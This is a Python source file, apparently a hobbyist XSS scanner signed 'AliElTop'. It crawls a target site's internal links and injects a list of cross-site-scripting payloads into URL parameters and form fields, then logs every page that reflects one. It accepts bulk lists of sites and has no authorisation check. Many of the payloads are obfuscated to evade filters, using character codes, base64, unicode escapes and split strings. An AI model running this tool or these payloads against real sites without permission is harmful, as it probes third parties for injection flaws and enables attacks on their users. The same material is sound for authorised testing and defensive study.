import aiohttp
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs
from colorama import Fore, Style, init

init(autoreset=True)
#AliElTop Version 1.0#
async def collect_internal_urls(base_url, url, visited_urls, max_depth=3, current_depth=0):
    if current_depth > max_depth:
        return

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    content = await response.text()
                    soup = BeautifulSoup(content, 'html.parser')
                    for a_tag in soup.find_all('a', href=True):
                        link = a_tag['href']
                        absolute_link = urljoin(url, link)

                        if urlparse(absolute_link).netloc == urlparse(base_url).netloc:
                            if absolute_link not in visited_urls:
                                print(Fore.GREEN + f"Collected: {absolute_link}" + Style.RESET_ALL)
                                visited_urls.add(absolute_link)
                                await collect_internal_urls(base_url, absolute_link, visited_urls, max_depth, current_depth + 1)
    except Exception as e:
        pass  


async def advanced_xss_testing(url, vuln_urls_file):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    print(Fore.CYAN + f"Testing {url} for XSS vulnerabilities..." + Style.RESET_ALL)

                    content = await response.text()

                    soup = BeautifulSoup(content, 'html.parser')
                    input_fields = soup.find_all(['input', 'textarea'])

                    test_payloads = [
    '" onmouseover="alert(\'AliElTop\')',
    '<img src=x onerror=alert("AliElTop")>',
    '<script>alert("AliElTop")</script>',
    '<svg/onload=alert("AliElTop")>',
    '<img src=javascript:alert("AliElTop")>',
    '<a href="javascript:alert(\'AliElTop\')">Click me</a>',
    '<img src=x onerror=confirm("AliElTop")>',
    '<img src=x onerror=prompt("AliElTop")>',
    '<img src=x onerror=eval(atob("YWxlcnQoJ2FscGhhJyk="))>',
    '<img src=x onerror=console.log("AliElTop")>',
    '<img src=x onerror=confirm`AliElTop`>',
    '<img src=x onerror=confirm(String.fromCharCode(65,108,105,69,108,84,111,112))>',
    '<img src=x onerror=String.fromCharCode(97,108,101,114,116)(`AliElTop`)>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,65,108,105,69,108,84,111,112,39,41))>',
    '<img src=x onerror=eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,40,41,32,123,10,32,32,32,32,97,108,101,114,116,40,34,65,108,105,69,108,84,111,112,34,41,10,32,32,32,32,125))>',
    'javascript:alert("AliElTop")',
    'javascript:alert(`AliElTop`)',
    'javascript:alert(String.fromCharCode(65,108,105,69,108,84,111,112))',
    'ja' + 'vas' + 'cript:alert("AliElTop")',
    '\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0041\u006C\u0069\u0045\u006C\u0054\u006F\u0070\u0022\u0029',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert("AliElTop")',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxOTApPC9zY3JpcHQ+',
    'vbscript:msgbox("AliElTop")',
    'data:text/javascript;base64,YWxlcnQoJ0FsaUVsVG9wJyk=',
    '<img src=x onerror=eval(String.fromCharCode(118, 97, 114, 32, 99, 111, 100, 101, 32, 61, 32, 34, 65, 108, 105, 69, 108, 84, 111, 112, 34, 59, 99, 111, 100, 101, 32, 43, 61, 32, 34, 60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 39, 65, 108, 105, 69, 108, 84, 111, 112, 39, 41, 59, 34, 59, 101, 118, 97, 108, 40, 99, 111, 100, 101, 41))>',
    '<img src=x onerror=eval(atob("PHNjcmlwdD5hbGVydCgxOTApLmNvbmZpZygnQWxpRWxUb3AnKTs8L3NjcmlwdD4="))>',
    '<img src=x onerror=eval(String.fromCharCode(102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 32, 123, 10, 32, 32, 32, 32, 99, 111, 100, 101, 32, 61, 32, 34, 65, 108, 105, 69, 108, 84, 111, 112, 34, 59, 10, 32, 32, 32, 32, 101, 118, 97, 108, 40, 99, 111, 100, 101, 41, 10, 32, 32, 32, 32, 125))>',
    'src` onerror=alert("AliElTop")',
    'src`%0aonerror=alert("AliElTop")',
    'data:image/svg+xml,<svg/onload=alert("AliElTop")>',
    'data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxOTApPC9zY3JpcHQ+',
    'jav%0ascr%0aipt:alert("AliElTop")',
    'javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0041\u006C\u0069\u0045\u006C\u0054\u006F\u0070\u0022\u0029',
    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert("AliElTop")',
    'javascript:\u0061\u006C\u0065\u0072\u0074(\u0060\u0041\u006C\u0069\u0045\u006C\u0054\u006F\u0070\u0060)',
    'ja' + 'vas' + 'cri' + 'pt:alert("AliElTop")',
                                    ]

                    # Inject payloads into the URL query parameters
                    parsed_url = urlparse(url)
                    query_parameters = parse_qs(parsed_url.query)

                    for param, param_values in query_parameters.items():
                        for payload in test_payloads:
                            modified_url = url.replace(f"{param}={''.join(param_values)}", f"{param}={payload}")
                            async with session.get(modified_url) as modified_response:
                                if payload in await modified_response.text():
                                    print(Fore.RED + f"XSS vulnerability detected at {modified_url}" + Style.RESET_ALL)
                                    vuln_urls_file.write(f"XSS vulnerability detected at {modified_url}\n")

                    for input_field in input_fields:
                        input_name = input_field.get('name')
                        if input_name:
                            for payload in test_payloads:
                                form_data = {input_name: payload}
                                async with session.post(url, data=form_data) as form_response:
                                    if payload in await form_response.text():
                                        print(Fore.RED + f"XSS vulnerability detected at {url} (form field: {input_name})" + Style.RESET_ALL)
                                        vuln_urls_file.write(f"XSS vulnerability detected at {url} (form field: {input_name})\n")
                else:
                    pass 
    except Exception as e:
        pass 

async def main():
    target_choice = input("Choose an option:\n1. Scan a single website\n2. Provide a text file with multiple websites\n")
    max_depth = int(input("Enter the maximum depth to crawl (e.g., 2): "))

    if target_choice == "1":
        target_url = input("Enter the target URL: ")
        target_urls = [target_url]
    elif target_choice == "2":
        websites_file = input("Enter the path to the text file containing websites: ")
        with open(websites_file, "r") as file:
            target_urls = file.read().splitlines()
    else:
        print("Invalid choice. Please choose 1 or 2.")
        return

    vuln_urls_file = open("vulnerable_urls.txt", "w")

    for target_url in target_urls:
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url

        visited_urls = set()
        visited_urls.add(target_url) 

        print(Fore.GREEN + f"Collecting internal URLs from {target_url}..." + Style.RESET_ALL)
        await collect_internal_urls(target_url, target_url, visited_urls, max_depth)

        tasks = []
        for url in visited_urls:
            tasks.append(advanced_xss_testing(url, vuln_urls_file))

        await asyncio.gather(*tasks)

    vuln_urls_file.close()

if __name__ == "__main__":
    asyncio.run(main())
